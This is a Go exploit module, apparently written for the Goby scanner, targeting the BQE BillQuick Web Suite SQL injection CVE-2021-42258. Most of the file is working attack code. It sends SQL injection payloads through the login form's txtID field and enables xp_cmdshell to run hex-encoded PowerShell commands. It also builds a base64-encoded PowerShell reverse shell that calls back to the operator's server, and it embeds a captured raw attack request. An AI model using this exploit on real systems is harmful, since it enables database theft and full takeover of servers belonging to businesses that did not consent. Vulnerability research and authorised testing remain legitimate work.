package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "BQE BillQuick Web Suite txtID / SQL Injection Vulnerability (CVE-2021-42258)",
    "Description": "<p>The BQE BillQuick Web Suite has many features aimed at improving productivity and providing comprehensive business insights to help professional service companies manage projects, resources, and finances more effectively.</p><p>Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, personal information of site users), but also write Trojans to the server in high privilege situations to further gain server system privileges.</p>",
    "Product": "BQE-Software",
    "Homepage": "https://www.bqe.com/",
    "DisclosureDate": "2021-11-11",
    "PostTime": "2024-06-14",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"BQE Software Inc\"",
    "GobyQuery": "body=\"BQE Software Inc\"",
    "Level": "3",
    "Impact": "<p>Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, personal information of site users), but also write Trojans to the server in high privilege situations to further gain server system privileges.</p>",
    "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.bqe.com\">https://www.bqe.com</a></p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,command,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        },
        {
            "name": "command",
            "type": "input",
            "value": "ping xxx.dnslog.cn",
            "show": "attackType=command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2021-42258"
    ],
    "CNNVD": [
        "CNNVD-202110-1637"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "BQE BillQuick Web Suite txtID / SQL 注入漏洞（CVE-2021-42258）",
            "Product": "BQE-Software",
            "Description": "<p>BQE BillQuick Web Suite在帮助专业服务公司更有效地管理项目、资源和财务方面，具有许多功能，旨在提高生产力并提供全面的业务洞察。<br></p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、厂商已发布解决方案，请更新到最新版本：<a href=\"https://www.bqe.com\">https://www.bqe.com</a></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "BQE BillQuick Web Suite txtID / SQL Injection Vulnerability (CVE-2021-42258)",
            "Product": "BQE-Software",
            "Description": "<p>The BQE BillQuick Web Suite has many features aimed at improving productivity and providing comprehensive business insights to help professional service companies manage projects, resources, and finances more effectively.</p><p>Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, personal information of site users), but also write Trojans to the server in high privilege situations to further gain server system privileges.</p>",
            "Recommendation": "<p>1. The manufacturer has released a solution, please update to the latest version: <a href=\"https://www.bqe.com\">https://www.bqe.com</a></p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can not only exploit SQL injection vulnerabilities to obtain information from the database (such as administrator backend passwords, personal information of site users), but also write Trojans to the server in high privilege situations to further gain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`
	// 注入请求
	injectionRequestdabnbiuioe78s := func(hostInfo *httpclient.FixUrl, sqlCommand, viewStateRegex, viewStateGeneratorRegex, eventValidationRegex string) (string, error) {
		injectionJudgmentdasdRequestConfig := httpclient.NewPostRequestConfig("/")
		injectionJudgmentdasdRequestConfig.VerifyTls = false
		injectionJudgmentdasdRequestConfig.FollowRedirect = false
		injectionJudgmentdasdRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		injectionJudgmentdasdRequestConfig.Data = "__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE=" + viewStateRegex + "&__VIEWSTATEGENERATOR=" + viewStateGeneratorRegex + "&__EVENTVALIDATION=" + eventValidationRegex + "&txtID=" + sqlCommand + "&txtPW=passwd&hdnClientDPI=96"
		resp, err := httpclient.DoHttpRequest(hostInfo, injectionJudgmentdasdRequestConfig)
		if err != nil {
			return "", err
		}
		match := regexp.MustCompile(`(?s)qjzqq(.*)qqbpq`).FindStringSubmatch(resp.Utf8Html)
		if len(match) >= 1 {
			return match[1], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	// 获取登录请求的关键数据
	obtainCriticalRequestSectiondsabnbn899i9dasd := func(hostInfo *httpclient.FixUrl) (string, string, string, error) {
		obtainKeyPartsRequestConfig := httpclient.NewGetRequestConfig("/")
		obtainKeyPartsRequestConfig.VerifyTls = false
		obtainKeyPartsRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, obtainKeyPartsRequestConfig)
		if err != nil {
			return "", "", "", err
		}
		viewStateRegex := regexp.MustCompile(`<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)" />`).FindStringSubmatch(resp.Utf8Html)
		viewStateGeneratorRegex := regexp.MustCompile(`<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)" />`).FindStringSubmatch(resp.Utf8Html)
		eventValidationRegex := regexp.MustCompile(`<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="([^"]+)" />`).FindStringSubmatch(resp.Utf8Html)

		if len(viewStateRegex) < 2 || len(viewStateGeneratorRegex) < 2 || len(eventValidationRegex) < 2 {
			return "", "", "", errors.New("请求构建提取失败")
		}

		return url.QueryEscape(viewStateRegex[1]), url.QueryEscape(viewStateGeneratorRegex[1]), url.QueryEscape(eventValidationRegex[1]), nil
	}

	// 执行 sql 语句
	executeSqlStatementsdash989311dmkas := func(hostInfo *httpclient.FixUrl, sqlCommand string) (string, error) {
		if strings.HasPrefix(sqlCommand, "select") {
			// 如果是，则将 "select" 替换为空
			sqlCommand = strings.Replace(sqlCommand, "select", "", 1)
		}
		viewStateRegex, viewStateGeneratorRegex, eventValidationRegex, err := obtainCriticalRequestSectiondsabnbn899i9dasd(hostInfo)
		if err != nil {
			return "", errors.New("请求构建提取失败")
		}
		genericUnionQuery, err := injectionRequestdabnbiuioe78s(hostInfo, "uname%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28113%29%2BISNULL%28CAST%28"+url.QueryEscape(sqlCommand)+"%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29--", viewStateRegex, viewStateGeneratorRegex, eventValidationRegex)
		if len(genericUnionQuery) >= 1 {
			return genericUnionQuery, nil
		}
		andErrorBased, err := injectionRequestdabnbiuioe78s(hostInfo, "uname'%2B(SELECT%20CHAR(104)%2BCHAR(109)%2BCHAR(106)%2BCHAR(79)%20WHERE%206316%3D6316%20AND%206084%20IN%20(SELECT%20(CHAR(113)%2BCHAR(106)%2BCHAR(122)%2BCHAR(113)%2BCHAR(113)%2B(SUBSTRING((ISNULL(CAST("+url.QueryEscape(sqlCommand)+"%20AS%20NVARCHAR(4000))%2CCHAR(32)))%2C1%2C1024))%2BCHAR(113)%2BCHAR(113)%2BCHAR(98)%2BCHAR(112)%2BCHAR(113))))%2B'--", viewStateRegex, viewStateGeneratorRegex, eventValidationRegex)
		if len(andErrorBased) >= 1 {
			return andErrorBased, nil
		}
		return "", errors.New("请求构建提取失败")
	}
	//判断漏洞是否存在
	injectionJudgmentdasd789lkmkasd := func(hostInfo *httpclient.FixUrl) bool {
		viewStateRegex, viewStateGeneratorRegex, eventValidationRegex, err := obtainCriticalRequestSectiondsabnbn899i9dasd(hostInfo)
		if err != nil {
			return false
		}
		genericUnionQuery, err := injectionRequestdabnbiuioe78s(hostInfo, "uname'+UNION+ALL+SELECT+CHAR(113)%2bCHAR(106)%2bCHAR(122)%2bCHAR(113)%2bCHAR(113)%2bCHAR(99)%2bCHAR(120)%2bCHAR(87)%2bCHAR(101)%2bCHAR(121)%2bCHAR(117)%2bCHAR(111)%2bCHAR(118)%2bCHAR(105)%2bCHAR(121)%2bCHAR(113)%2bCHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(113)--", viewStateRegex, viewStateGeneratorRegex, eventValidationRegex)

		if strings.Contains(genericUnionQuery, "cxWeyuoviy") {
			return true
		}

		andErrorBased, err := injectionRequestdabnbiuioe78s(hostInfo, "uname'%2B(SELECT%20CHAR(104)%2BCHAR(109)%2BCHAR(106)%2BCHAR(79)%20WHERE%206316%3D6316%20AND%206084%20IN%20(SELECT%20(CHAR(113)%2BCHAR(106)%2BCHAR(122)%2BCHAR(113)%2BCHAR(113)%2BCHAR(99)%2BCHAR(120)%2BCHAR(87)%2BCHAR(101)%2BCHAR(121)%2BCHAR(117)%2BCHAR(111)%2BCHAR(118)%2BCHAR(105)%2BCHAR(121)%2BCHAR(113)%2BCHAR(113)%2BCHAR(98)%2BCHAR(112)%2BCHAR(113))))%2B'--", viewStateRegex, viewStateGeneratorRegex, eventValidationRegex)

		if err != nil {
			return false
		} else if strings.Contains(andErrorBased, "cxWeyuoviy") {
			return true
		}

		return false
	}

	// 执行系统命令
	executeSystemCommandsdasdahjgh77821bnh := func(hostInfo *httpclient.FixUrl, command string) (string, error) {
		viewStateRegex, viewStateGeneratorRegex, eventValidationRegex, err := obtainCriticalRequestSectiondsabnbn899i9dasd(hostInfo)
		if err != nil {
			return "", err
		}

		// 判断是否是sa权限
		saJudgmentRequest, err := injectionRequestdabnbiuioe78s(hostInfo, "uname%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28113%29%2BISNULL%28CAST%28+is_srvrolemember%28%27sysadmin%27%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29--", viewStateRegex, viewStateGeneratorRegex, eventValidationRegex)
		if err != nil {
			return "", err
		} else if !(saJudgmentRequest == "1") {
			return "", errors.New("无法执行命令权限低！")
		}

		injectionJudgmentdasdRequestConfig := httpclient.NewPostRequestConfig("/")
		injectionJudgmentdasdRequestConfig.VerifyTls = false
		injectionJudgmentdasdRequestConfig.FollowRedirect = false
		injectionJudgmentdasdRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		// 启动 xp_cmdshell
		injectionJudgmentdasdRequestConfig.Data = "__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE=" + viewStateRegex + "&__VIEWSTATEGENERATOR=" + viewStateGeneratorRegex + "&__EVENTVALIDATION=" + eventValidationRegex + "&txtID=uname%27%3bEXEC+sp_configure+'show+advanced+options',+1%3bRECONFIGURE%3bEXEC+sp_configure+'xp_cmdshell',+1%3bRECONFIGURE%3b--&txtPW=passwd&hdnClientDPI=96"
		_, err = httpclient.DoHttpRequest(hostInfo, injectionJudgmentdasdRequestConfig)
		if err != nil {
			return "", err
		}

		// 执行命令
		injectionJudgmentdasdRequestConfig.Data = "__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE=" + viewStateRegex + "&__VIEWSTATEGENERATOR=" + viewStateGeneratorRegex + "&__EVENTVALIDATION=" + eventValidationRegex + "&txtID=" + `uname%27%3bEXEC+xp_cmdshell+'POWERSHELL.EXE+-COMMAND+"$X+%3d+(-JOIN+(''` + hex.EncodeToString([]byte(command)) + `''+-SPLIT+''(..)''+|+%3f+{+$_+}++|+%25+{[CHAR][CONVERT]%3a%3aTOUINT32($_,16)}))%3b+IEX+$X"'--` + "&txtPW=passwd&hdnClientDPI=96"
		_, err = httpclient.DoHttpRequest(hostInfo, injectionJudgmentdasdRequestConfig)
		if err != nil {
			return "", err
		}

		return "无回显外带方式，无法通过响应判断", nil

	}

	// 反弹 shell
	bounceShelldasda67831nnmnbisdas := func(hostInfo *httpclient.FixUrl, host, port string) {
		//用于生成 PowerShell 逆向 Shell 的命令行字符串
		payload := `$client = New-Object System.Net.Sockets.TCPClient("` + host + `",` + port + `);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
		codeUnits := make([]byte, len(payload)*2)
		for i, char := range payload {
			codeUnits[i*2] = byte(char)
			codeUnits[i*2+1] = byte(char >> 8)
		}
		encodedPayload := base64.StdEncoding.EncodeToString(codeUnits)
		command := fmt.Sprintf("powershell -e %s", encodedPayload)
		executeSystemCommandsdasdahjgh77821bnh(hostInfo, command)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			return injectionJudgmentdasd789lkmkasd(hostinfo)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "sql" {
				result, err := executeSqlStatementsdash989311dmkas(expResult.HostInfo, goutils.B2S(stepLogs.Params["sql"]))
				if err != nil {
					expResult.Success = false
				} else if len(result) >= 1 {
					expResult.Success = true
					expResult.Output = result
				}
			} else if attackType == "command" {
				resp, err := executeSystemCommandsdasdahjgh77821bnh(expResult.HostInfo, goutils.B2S(stepLogs.Params["command"]))
				if err != nil {
					expResult.Success = false
				} else {
					expResult.Success = true
					expResult.Output = resp
				}
			} else if attackType == "sqlPoint" {
				if injectionJudgmentdasd789lkmkasd(expResult.HostInfo) {
					expResult.Success = true
					expResult.Output = `POST / HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 1717
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
			
__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4MzE3MTAzMjcPZBYEAgMPDxYCHgRUZXh0BRJWZXJzaW9uOiAyMC4wLjE0LjJkZAIFD2QWBgIDD2QWBgIDDw9kFgIeBGhyZWYFKWphdmFzY3JpcHQ6RGlzcGxheUhlbHAoJy9sb2dpbi5odG0nLHRydWUpZAIFDw8WBB8ABSJLaGFmcmEgRW5naW5lZXJpbmcgQ29uc3VsdGFudHMgSW5jHgdUb29sVGlwBVFLaGFmcmEgRW5naW5lZXJpbmcgQ29uc3VsdGFudHMgSW5jIFVzaW5nIChLSEFGUkEyMDE5KSBvbiAodGNwOjE5Mi4xNjguMTAuMjIsMTQzMylkZAILDw9kFgIfAQW7AmphdmFzY3JpcHQ6T3BlbkN1c3RvbWl6ZWRQYWdlKCdodHRwczovLzM4LjEwMS4yMTkuMTE3OjQ0My9BZG1pbi9mcm1TdGFydHVwT3B0aW9ucy5hc3B4P1JldHVyblVSTD1odHRwczovLzM4LjEwMS4yMTkuMTE3OjQ0My9kZWZhdWx0LmFzcHgmUmV0dXJuUGF0aD1DOi9Qcm9ncmFtIEZpbGVzICh4ODYpL0JpbGxRdWljayBXZWIgU3VpdGUvV2ViIFN1aXRlIDIwMTkgLSBLSEFGUkEvcHVibGljJywnT3B0aW9ucycsJ3N0YXR1cz0xLHRvcD0yMCxsZWZ0PTcwLHRvb2xiYXI9MCx3aWR0aD05NjAsaGVpZ2h0PTg1MCxzY3JvbGxiYXJzPTEscmVzaXphYmxlPTEnKWQCBw8PFgIeB1Zpc2libGVoZBYEAgEPEA8WAh8DaGRkZGQCAw8PFgIfA2hkZAIJD2QWAgIDDw9kFgIeB29uY2xpY2sFhAFKYXZhU2NyaXB0OnZhciBOd25kPSB3aW5kb3cub3BlbignaHR0cDovL3d3dy5icWUuY29tL1JlYWR5VG9CdXkuYXNwJywnQmlsbFF1aWNrJywnc3RhdHVzPTEscmVzaXphYmxlPTEnKTsgTnduZC5mb2N1cygpO3JldHVybiBmYWxzZTtkZB3Mrl3fU%2BWJaCiLBbzhaY2ysAqWlewxOTHTnkPrPTgw&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAeCxf%2F6Yj0C6EYxtnGFNV3yiDzhgTayErTY5zy3eV0%2BKFncozjiY2uerT4fyhfyLsuRO4wbr9XDALim0BHyPei6XNiiK4rX19Q4jotFU35tutB%2BE%2BwdjwdLhtRmnvNWW5XjXQFozpEkqmpvVssmq69gek8SP0qI%2FNNBUc8dJKwYP0NzySJw718QQ7HiRCbZeKo%3D&txtID=uname'+UNION+ALL+SELECT+CHAR(113)%2bCHAR(106)%2bCHAR(122)%2bCHAR(113)%2bCHAR(113)%2bCHAR(99)%2bCHAR(120)%2bCHAR(87)%2bCHAR(101)%2bCHAR(121)%2bCHAR(117)%2bCHAR(111)%2bCHAR(118)%2bCHAR(105)%2bCHAR(121)%2bCHAR(113)%2bCHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(113)--+SlaR&txtPW=passwd&hdnClientDPI=96`
					return expResult
				} else {
					expResult.Success = false
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				fmt.Println(rp)
				bounceShelldasda67831nnmnbisdas(expResult.HostInfo, godclient.GetGodServerHost(), rp)
				//bounceShelldasda67831nnmnbisdas(expResult.HostInfo, "", "")
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 30):
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			}
			return expResult
		},
	))
}
